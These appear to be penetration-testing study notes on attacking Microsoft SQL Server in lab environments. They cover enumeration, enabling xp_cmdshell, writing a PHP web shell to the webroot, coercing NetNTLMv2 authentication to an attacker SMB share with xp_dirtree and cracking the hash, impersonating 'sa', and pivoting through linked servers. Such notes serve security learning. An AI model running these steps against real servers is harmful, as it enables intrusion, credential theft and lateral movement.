---
title: "MSSQL"
description: MSSQL Database
categories: [Services]
tags: [Services, Database, MSSQL]
weight: 2
---

## Service Info
- Name: MSSQL
- Purpose: Database
- Listening port: **1433 TCP**
- OS: Windows

MSSQL is Microsoft's proprietary implementation of a SQL database. It is designed to tightly intergrate into a Windows and Active Directory centric environment. MSSQL is also a popular choice for building applications that run on .NET framework.

### MSSQL Authenticaiton
MSSQL supports two authentication methods:
1. **Windows auth**: Used by default, also referred to as **intergrated** security due to its security model being tightly intergrated with Windows and AD.
    - Specific users and group are trusted to log in to the SQL server.
2. **Mixed mode**: Supports both Windows/AD accounts and SQL server.
    - Username and Password are maintained within the SQL server.

### MSSQL Default Databases
MSSQL has several default databases it uses to store information about the database itself as well as information that can help us enumerate names, tables, columns, and etc.:
- `master` - keeps the information for an instance of SQL Server.
- `msdb` - used by SQL Server Agent.
- `model` - a template database copied for each new database.
- `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
- `tempdb` - keeps temporary objects for SQL queries.

## Service Enumeration
With default (`-sC`) scripts, Nmap enumerates the host's NeBIOS domain name and host name through MSSQL. The version and release of the MSSQL service are also enumerated.
```shell-session
╭─brian@rx-93-nu ~
╰─$ nmap -Pn -sV -sC -p1433 10.10.10.125

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST
Nmap scan report for 10.10.10.125
Host is up (0.0099s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: mssql-test
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: mssql-test.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-08-26T01:04:36
|_Not valid after:  2051-08-26T01:04:36
|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.

Host script results:
|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s
| ms-sql-info:
|   10.10.10.125:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
```

## Service Interaction

To connect to an MSSQL instance from a Windows host, we can use `sqlcmd`:
```shell-session
C:\> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

1>
```

On a Linux host, we can use `mssqlclient.py` from Impacket:
```shell-session
╭─brian@rx-93-nu ~
╰─$ mssqlclient.py -p 1433 julio@10.129.203.7

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208)
[!] Press help for extra shell commands
SQL>
```
- When using Windows Authentication, make sure to specify the domain or hostname of the target, or else `mssqlclient.py` would assume you are using SQL authentication.

## Database Enumeration
Enumeration of the database goes like the following:
```txt
Databases --> Tables --> Columns --> Table Content
```
### Show and Select a Database
```shell-session
1> SELECT name FROM master.dbo.sysdatabases
2> GO

name
--------------------------------------------------
master
tempdb
model
msdb
htbusers
3> USE htbusers
4> GO

Changed database context to 'htbusers'.
```

### Enumerate Tables
```shell-session
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO

table_name
--------------------------------
actions
permissions
permissions_roles
permissions_users
roles
roles_users
settings
users
(8 rows affected)
```

From where, we can choose to dump the entire table.
```shell-session
1> SELECT * FROM users
2> go

id          username             password         data_of_joining
----------- -------------------- ---------------- -----------------------
          1 admin                p@ssw0rd         2020-07-02 00:00:00.000
          2 administrator        adm1n_p@ss       2020-07-02 11:30:50.000
          3 john                 john123!         2020-07-02 11:47:16.000
          4 tom                  tom123!          2020-07-02 12:23:16.000

(4 rows affected)
```
If there are too many columns in a table, we can choose to enumerate the columns first, then `SELECT` only the columns we wish to read.
```shell-session
SELECT column_name FROM htbusers.INFORMATION_SCHEMA.COLUMNS
```

## Command Execution
**MSSQL** has an **extended stored procedure** called `xp_cmdshell` that allows us to execute system commands using SQL.
- `xp_cmdshell` is disabled by default. It can be enabled using **Policy-Based Management** or `sp_configure`.
- The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account.
- `xp_cmdshell` operates synchronously, control is not returned until command returns.

The `sysadmin` fixed server role is required to enable `xp_cmdshell`. Use the query below to check if your user has that role.
```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
```
- `1` for yes, `0` for no.

If the appropriate privileges are , you can enable `show advanced options` and then `xp_cmdshell`:
```sql
-- To allow advanced options to be changed.
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.
RECONFIGURE
GO

-- To enable the feature.
EXECUTE sp_configure 'xp_cmdshell', 1
GO

-- To update the currently configured value for this feature.
RECONFIGURE
GO
```
Then, we can execute commands using `xp_cmdshell <cmd>`
```shell-session
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

In `mssqlclient.py`, enabling `xp_cmdshell` is automated with a single `enable_xp_cmdshell` command:
```shell-session
╭─brian@rx-93-nu ~
╰─$ mssqlclient.py dbadmin@172.16.7.60
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (dbadmin  dbo@master)> enable_xp_cmdshell
INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (dbadmin  dbo@master)> xp_cmdshell whoami
output
---------------------------
nt service\mssql$sqlexpress
NULL
```

## Reading/Writing Local Files
By default, `MSSQL` allows file read on any file in the OS to which the account has read access.
```shell-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should

(1 rows affected)
```

File write from MSSQL, on the other hand, requires **Ole Automation Procedures** to be enabled, which in turn requires admin privileges.
- Like on MySQL servers, file write can be leveraged for command execution via the use of a web shell (an example PHP web shell is show below).
```shell-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```
Then, we can create a file like so:
```shell-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

## Capture MSSQL Service Hash
If we get query execution capabilities through SQL injection or we can login as a non-admin user, we can steal the MSSQL service account NetNTLMv2 hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which uses the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system.
- We can use one of these stored procedures and point them at an attacker-controlled SMB share that forces the MSSQL service to authenticate via NetNTLMv2, which can be done with either **Responder** or **Impacket smbserver.py**

We set up either Responder or `smbserver.py`, then use the stored procedure to coerce NTLM authentication.

```shell-session
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

subdirectory    depth
--------------- -----------
```
```shell-session
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
```
Then on Responder or `smbserver.py`, we should see the NetNTLMv2 hash of the MSSQL service account captured:
```shell-session
╭─brian@rx-93-nu ~
╰─$ sudo responder -I tun0

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
<SNIP>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
```
```shell-session
╭─brian@rx-93-nu ~
╰─$ sudo smbserver.py share ./ -smb2support

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.203.7,49728)
[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
[*] User WINSRV02\mssqlsvc authenticated successfully
[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
[*] Closing down connection (10.129.203.7,49728)
[*] Remaining connections []
```

This NetNTLMv2 hash can then be cracked using Hashcat Mode 5600
```bash
hashcat -m 5600 -O demouser.ntlmv2 /usr/share/dict/rockyou.txt
```

## Impersonate Existing Users
MSSQL has a special privilege called **IMPERSONATE**, which allows the executing user to take on the permissions of another user. This could allow an attacker with access to an account granted such privilege to achieve privilege escalation or lateral movement.

Usually, sysadmins are allowed to impersonate any other user, while non-admin users needs to have this privilege assigned to them.

To carry out this attack, we first identify users we can impersonate:
```shell-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

Now, for example, we impersonate user `sa`.  At the same time, we check if `sa` is part of the `sysadmin` role.
```shell-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```
- The impersonation was successful and `1` indicates `sa` has the `sysadmin` role.

## MSSQL Linked Servers
MSSQL has a configuration option called **linked servers**, which allowed the DB engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server. If configured, this allows attackers who control the MSSQL instance to move laterally onto other database servers.

We can configured identiy linked server like so:
```shell-session
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
- `0` indicates linked server (what we want).
- `1` indicates remote server.
```

Now, we can execute queries on the linked server like so:
```shell-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```

This process can be simplified when using `mssqlclient.py`. The `enum_link` command allows us to quickly enumerate linked servers, while `use_link` allows us to run queries without typing the remote query statement out every time.
```shell-session
SQL (sqluser  guest@master)> enum_links
SRV_NAME                SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE          SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
---------------------   ----------------   -----------   ---------------------   ------------------   ------------   -------
LOCAL.TEST.LINKED.SRV   SQLNCLI            SQL Server    LOCAL.TEST.LINKED.SRV   NULL                 NULL           NULL
WINSRV02\SQLEXPRESS     SQLNCLI            SQL Server    WINSRV02\SQLEXPRESS     NULL                 NULL           NULL
Linked Server           Local Login   Is Self Mapping   Remote Login
---------------------   -----------   ---------------   ------------
LOCAL.TEST.LINKED.SRV   sqluser                        0   testadmin
SQL (sqluser  guest@master)> use_link "LOCAL.TEST.LINKED.SRV"

SQL >"LOCAL.TEST.LINKED.SRV" (testadmin  dbo@master)> select IS_SRVROLEMEMBER('sysadmin')

-
1
```
